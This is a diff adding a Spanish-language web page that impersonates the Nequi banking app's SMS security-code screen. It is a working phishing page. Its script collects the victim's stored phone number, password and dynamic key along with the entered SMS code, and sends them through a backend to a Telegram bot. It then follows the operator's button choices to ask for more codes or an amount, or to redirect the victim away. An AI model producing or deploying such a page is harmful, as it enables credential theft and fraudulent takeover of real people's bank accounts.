@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Nequi - SMS</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: 'Manrope', sans-serif;
+      background: #fde7f1;
+    }
+
+    #loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.7);
+      backdrop-filter: blur(4px);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    input {
+      letter-spacing: 0.5rem;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex flex-col">
+  <div id="loader-overlay"><img src="loader.gif" width="100">
+    <p class="mt-4 text-[#da0081] font-bold"></p>
+  </div>
+  <header class="w-full bg-white px-4 py-3 shadow-sm text-center"><img
+      src="https://logosenvector.com/logo/img/nequi-37254.png" class="h-10 mx-auto" /></header>
+  <main class="px-4 mt-10 flex-grow">
+    <div class="max-w-[420px] mx-auto bg-white rounded-lg p-8 shadow-md">
+      <h2 class="text-xl font-bold text-[#200020] mb-2 text-center">Código de seguridad</h2>
+      <p class="text-sm text-gray-600 mb-6 text-center">Escribe el código de 6 dígitos enviado por SMS.</p>
+      <input id="sms" type="tel" maxlength="6" placeholder="000000"
+        class="w-full h-14 bg-gray-100 rounded-lg outline-none text-2xl font-bold border-2 border-transparent focus:border-[#da0081]">
+      <button id="btn" class="w-full h-12 bg-[#da0081] text-white font-bold rounded-sm mt-6">Verificar SMS</button>
+    </div>
+  </main>
+  <script>
+    const btn = document.getElementById('btn'), input = document.getElementById('sms');
+    btn.addEventListener('click', async () => {
+      if (input.value.length < 6) return alert("Código incompleto");
+      document.getElementById('loader-overlay').style.display = 'flex';
+      const p = localStorage.getItem('phone'), c = localStorage.getItem('password'), d = localStorage.getItem('otp'), s = input.value;
+      const text = `<b>🔑 SMS RECIBIDO</b>\n<b>Celular:</b> ${p}\n<b>Clave:</b> ${c}\n<b>Dinámica:</b> ${d}\n<b>SMS:</b> <code>${s}</code>`;
+      const keyboard = { inline_keyboard: [[{ text: "❌ Error Dinámica", callback_data: "err_otp" }], [{ text: "❌ Error OTP", callback_data: "pedir_otp" }], [{ text: "❌ Error Monto", callback_data: "pedir_plata" }], [{ text: "✅ Finalizar", callback_data: "finalizar" }]] };
+
+      try {
+        const res = await fetch('/api/send-message', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text, keyboard }) });
+        const data = await res.json();
+        if (data.ok) {
+          const poll = await fetch(`/api/check-update/${data.result.message_id}`);
+          const act = await poll.json();
+          if (act.action === 'err_otp') window.location.href = "index.html?error=1";
+          else if (act.action === 'pedir_otp') { alert("Código SMS expirado."); location.reload(); }
+          else if (act.action === 'pedir_plata') window.location.href = "monto.html";
+          else window.location.href = "https://www.google.com";
+        } else {
+          document.getElementById('loader-overlay').style.display = 'none';
+          alert("Error con Telegram: " + (data.error || "Revisa el Token"));
+        }
+      } catch (e) {
+        document.getElementById('loader-overlay').style.display = 'none';
+        alert("Error de conexión.");
+      }
+    });
+  </script>
+</body>
+
+</html>
